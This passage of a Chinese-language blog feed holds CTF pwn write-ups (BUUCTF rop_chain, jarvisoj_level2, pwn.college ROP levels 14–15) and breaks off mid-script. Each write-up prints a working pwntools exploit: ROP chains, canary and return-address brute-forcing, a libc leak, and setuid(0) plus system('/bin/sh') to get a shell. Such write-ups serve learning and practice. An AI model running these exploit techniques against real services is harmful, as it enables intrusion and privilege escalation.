    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF上一道构造ROP链的题目，原题链接在这：<a href="https://buuoj.cn/challenges#picoctf_2018_rop%20chain">BUUCTF原题：PicoCTF_2018_rop_chain</a><br></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是拖进IDA反编译查看，发现溢出点在vuln函数：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/IDA-vuln.png"><br>接下来checksec看一下，看到只开启了NX保护：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/checksec.png"><br>考虑ROP，发现IDA的函数表一栏中存在两个win函数和一个flag函数，分别反编译分析源代码，如下图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/IDA-win_function1.png"><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/IDA-win_function2.png"><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/IDA-flag.png"><br>可以看到三个函数逻辑都很清晰，win1和win2是两个全局变量（双击可以在bss段看到它们的地址），flag会检查这两个变量以及自己的参数，满足要求即输出flag<br><br>所以，漏洞点即为通过溢出，构造ret链，分别调用这3个函数即可<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先找偏移，可以直接在IDA里看出来offset&#x3D;0x18+0x4&#x3D;28<br><br>之后objdump反汇编，看到3个函数的地址，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/disas.png"><br>综上，利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br><span class="hljs-comment"># ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x4006a4&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27661</span>)<br>offset=<span class="hljs-number">28</span><br>retGadget=<span class="hljs-number">0x80483f6</span><br>win1Addr=<span class="hljs-number">0x80485cb</span><br>win2Addr=<span class="hljs-number">0x80485d8</span><br>flagAddr=<span class="hljs-number">0x804862b</span><br>win2Argc=-<span class="hljs-number">1163220307</span><br>flagArgc=-<span class="hljs-number">559039827</span><br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter your input&gt; &quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(win1Addr)+p32(win2Addr)+p32(flagAddr)+p32(win2Argc,sign=<span class="hljs-literal">True</span>)+p32(flagArgc,sign=<span class="hljs-literal">True</span>)<br>ioTube.sendline(payload)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br></code></pre></td></tr></table></figure><p>最后一个要注意的是对负数的打包，在pwn库中p系列函数默认是打包无符号数，因此要设置sign&#x3D;True</p>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>ROP</category>
      
      <category>ret2text</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-jarvisoj_level2</title>
    <link href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/"/>
    <url>/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF上一道ROP类型题目，原题链接在这：<a href="https://buuoj.cn/challenges#jarvisoj_level2">BUUCTF原题：jarvisoj_level2</a><br></p><span id="more"></span><p>思路容易想到，但是32位程序，由于不熟悉32位程序的特点卡了一段时间，因此做个记录<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先检查开启了哪些保护<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/checksec.png"><br>可以看到只开启了NX<br><br>然后把二进制文件拖入IDA分析<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/IDA-vuln.png"><br>可以看到溢出点发生在vulnerable_function，同时注意到程序使用了system函数，因此考虑能不能ret2text（只要找到&#x2F;bin&#x2F;sh字符串即可）<br><br>shift+F12看一下，太好了，在程序里找到了&#x2F;bin&#x2F;sh字符串，如下图<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/IDA-binsh.png"><br>至此，可以得知，这道题的漏洞点就是构造ROP链，利用溢出返回到system函数地址，拿到shell<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，在IDA里可以直接看到，由于返回地址在ebp往上4个字节（32位，64位就是8个字节），offset&#x3D;0x88+0x4&#x3D;0x8C<br><br>对于system函数和&#x2F;bin&#x2F;sh字符串，这里直接通过python的pwn库定位，比较方便，不用硬编码<br><br>另外，由于32位系统的特点，此处不需要寻找pop rdi的指令碎片，也不需要考虑16字节对齐<br><br>32位传参时，通过栈进行传递，一般为返回地址1、返回地址2、参数1、参数2，即和返回地址依次对应，因此在sysAddr上方填充一个0作为返回地址（填什么都可以，拿到shell就不会回来了），否则binsh字符串会被解析为下一个返回地址<br><br>因此可以写出如下的利用脚本<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./BUUCTF08&quot;</span><br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;set follow-fork-mode parent&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25094</span>)<br>elf=ELF(targetELF)<br>offset=<span class="hljs-number">0x8C</span> <span class="hljs-comment">#还有116个字节的机会</span><br>sysAddr=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>binshArgc=<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#open(&quot;sysAddr.txt&quot;,&quot;w&quot;).write(str(hex(sysAddr)))</span><br><span class="hljs-comment">#open(&quot;binsh.txt&quot;,&quot;w&quot;).write(str(hex(binshArgc)))</span><br>ioTube.recvuntil(<span class="hljs-string">&quot;Input:\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(sysAddr)+p32(<span class="hljs-number">0</span>)+p32(binshArgc)<br>ioTube.send(payload)<br><span class="hljs-comment">#ioTube.recv()</span><br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>ROP</category>
      
      <category>ret2text</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-14-and-15</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>14.0和15.0两题放在一起，主要因为这两题方法类似，但又存在一些trick方面的坑<br><br>这两题目标程序的逻辑相同，均是监听端口、通过fork子进程处理请求，溢出点也在子进程<br></p><span id="more"></span><p>先以14.0为例，15.0和其非常类似，只是需要一个类似脑筋急转弯的trick，能想到就很容易，想不到就会一直卡住（比如我靠自己就死活没想到）</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先一样的checksec，看到保护全开<br><br>接下来使用IDA，反编译一下<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-14-and-15/level-14-main.png"><br>看到main函数会不停的fork子进程，由子进程调用challenge函数来处理链接<br><br>main函数里正好也没发现溢出点，进challenge看一下，果不其然溢出点就在challenge的read这里<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>根据分析，漏洞利用思路就是：<br><br>首先爆破canary的值，爆破的理论基础见<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/Binary-Exp/">串联梳理：Pwn-Exp</a><br><br>之后爆破函数返回地址拿到程序本身的基地址<br><br>接着用程序本身的gadget去泄露libc基地址，类似level4的方法<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level-4</a><br><br>最后，拿到libc基地址，那就可以随便调用函数去拿shell了<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span><br>libcPath = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>],log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment"># ioHandler=gdb.debug(targetELF,&quot;b *main+785&quot;)</span><br><br>offset=<span class="hljs-number">72</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br>pop_rdi_offset=<span class="hljs-number">0x26c3</span> <span class="hljs-comment">#challenge里面的偏移，pop rdi碎片用challenge里面的</span><br><br><span class="hljs-comment">#爆破canary</span><br>knownCanary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        testByte=test.to_bytes(<span class="hljs-number">1</span>)<br>        payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+testByte<br><br>        ioHandler.send(payload1)<br>        response=ioHandler.recvall().decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;stack smashing detected&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response:<br>            knownCanary+=testByte<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-comment">#爆破返回地址，challenge里应该是回到……?636，main里面</span><br>retAddrOffset=<span class="hljs-number">0x2636</span><br>returnAddr=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> returnAddr==<span class="hljs-string">b&#x27;&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;爆破失败\n&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;次，遍历到了数字&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,test))<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+returnAddr+p8(test)<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PayLoad&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(payload2)<br><br>        ioHandler.send(payload2)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!&quot;</span>)<br>        response=ioHandler.recvall(timeout=<span class="hljs-number">3</span>).decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Goodbye&quot;</span> <span class="hljs-keyword">in</span> response:<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br><br>returnAddr=<span class="hljs-built_in">int</span>.from_bytes(returnAddr,<span class="hljs-string">&quot;little&quot;</span>)<br>elfBase=returnAddr-retAddrOffset<br>pop_rdiReal=elfBase+pop_rdi_offset<br>elf.address=elfBase<br>retPadAlign=elfBase+<span class="hljs-number">0x101a</span><br><br><span class="hljs-comment">#泄露libc基地址</span><br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;setvbuf&quot;</span><br>leakFuncOffset=libc.symbols[leakFuncName]<br>leakFuncGOT=elf.got[leakFuncName]<br><br><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>) + knownCanary + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdiReal) + p64(leakFuncGOT) + p64(retPadAlign) + p64(pltAddr)<br>ioHandler.send(payload3)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!\n&quot;</span>)<br><br>realAddr=u64(ioHandler.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcBase=realAddr-libc.symbols[leakFuncName]<br><br><span class="hljs-comment">#print(&quot;泄露函数名=&#123;&#125;；真实地址=&#123;&#125;；该函数偏移=&#123;&#125;；libc基址=&#123;&#125;\n&quot;.format(leakFuncName,hex(realAddr),hex(leakFuncOffset),hex(libcBase)))</span><br><br><span class="hljs-comment">#最后阶段，调用system的准备</span><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>setuidAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;setuid&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br><span class="hljs-comment">#开始最后阶段调用system</span><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br>payload4=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdiReal)+p64(<span class="hljs-number">0</span>)+p64(setuidAddr)+p64(pop_rdiReal)+p64(binshAddr)+p64(sysAddr)<br>ioHandler.recv()<br>ioHandler.send(payload4)<br><br>ioHandler.recv()<br>ioHandler.interactive()<br></code></pre></td></tr></table></figure><h1 id="level15-0的trick"><a href="#level15-0的trick" class="headerlink" title="level15.0的trick"></a>level15.0的trick</h1><p>其实，level15.0和14.0的源码结构基本上都一致，唯一的区别就是15.0是在main函数里直接处理请求，因此没有challenge函数了<br><br>也就是说溢出后返回地址是libc里面的地址，如下图<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-14-and-15/level-15-main.png"><br>这会带来一个问题，因为我们注意到在level14.0中，是如何判断返回地址爆破正确还是错误？是通过输出，因为如果返回到main函数，会相应输出”Goodbye”,如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Goodbye&quot;</span> <span class="hljs-keyword">in</span> response:<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>但是，15题是从main函数返回，转而调用exit，因此即便正确爆破返回地址，也没有任何输出供我们判断<br><br>这里卡了很久……，最后经提醒才想到：<br><br>为什么一定要爆破返回地址的值呢？<br><br>最终目的是拿到libc基址，又不是要爆破返回地址！<br><br>所以，既然原返回地址后面没输出，那就跳到main开始的地方去，那里有输出啊！<br><br>这样，思路就转化成爆__libc_start_main的地址即可，反正__libc_start_main也在libc库里面<br><br>综上，写出的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level15.0&quot;</span><br>libcPath = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>],log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#ioHandler=gdb.debug(targetELF,&quot;b *main+785&quot;)</span><br><br>offset=<span class="hljs-number">104</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br><span class="hljs-comment">#爆破canary</span><br>knownCanary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        testByte=test.to_bytes(<span class="hljs-number">1</span>)<br>        payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+testByte<br><br>        ioHandler.send(payload1)<br>        response=ioHandler.recvall().decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;stack smashing detected&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response:<br>            knownCanary+=testByte<br>            <span class="hljs-keyword">break</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KillProc</span>(<span class="hljs-params">response</span>):<br>    pattern = <span class="hljs-string">r&quot;(\d+):\ttransferring control&quot;</span><br>    matches=re.findall(pattern,response)<br>    <span class="hljs-keyword">if</span>(matches):<br>        pid=(<span class="hljs-built_in">int</span>)(matches[<span class="hljs-number">0</span>])<br>        os.kill(pid, signal.SIGTERM)<br><br><br><span class="hljs-comment">#该如何衡量main函数的返回地址“猜对了”还是“猜错了”？？？</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">main退出流程：</span><br><span class="hljs-string">1 main-&gt;return 0，执行ret指令之前rsp指向的地方存着mov rdi,rax指令的地址，然后pop rip</span><br><span class="hljs-string">2 跳去执行mov rdi,rax（此时rax=0），这个0将作为exit的参数</span><br><span class="hljs-string">3 call exit</span><br><span class="hljs-string">没有输出？？？</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">response</span>): <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;This challenge is listening for connections on TCP port 1337.&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment">#爆破__libc_start_main地址</span><br>returnAddr=<span class="hljs-string">b&#x27;\x2D&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> returnAddr==<span class="hljs-string">b&#x27;\x2D&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;爆破失败\n&quot;</span>)<br>        sys.exit()<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;次，遍历到了数字&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,test))<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+returnAddr+p8(test)<br><br>        ioHandler.send(payload2)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!&quot;</span>)<br>        response=ioHandler.recvall(timeout=<span class="hljs-number">3</span>).decode()<br>        ioHandler.close()<br>        <span class="hljs-keyword">if</span> check(response):<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br><br>returnAddr=<span class="hljs-built_in">int</span>.from_bytes(returnAddr,<span class="hljs-string">&quot;little&quot;</span>)<br><span class="hljs-comment">#最后阶段，调用system的准备</span><br>iThinkRetOffset=<span class="hljs-number">0x2402d</span><br>libcBase=returnAddr-iThinkRetOffset<br>pop_rdiReal=libcBase+<span class="hljs-number">0x23b6a</span><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>setuidAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;setuid&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span 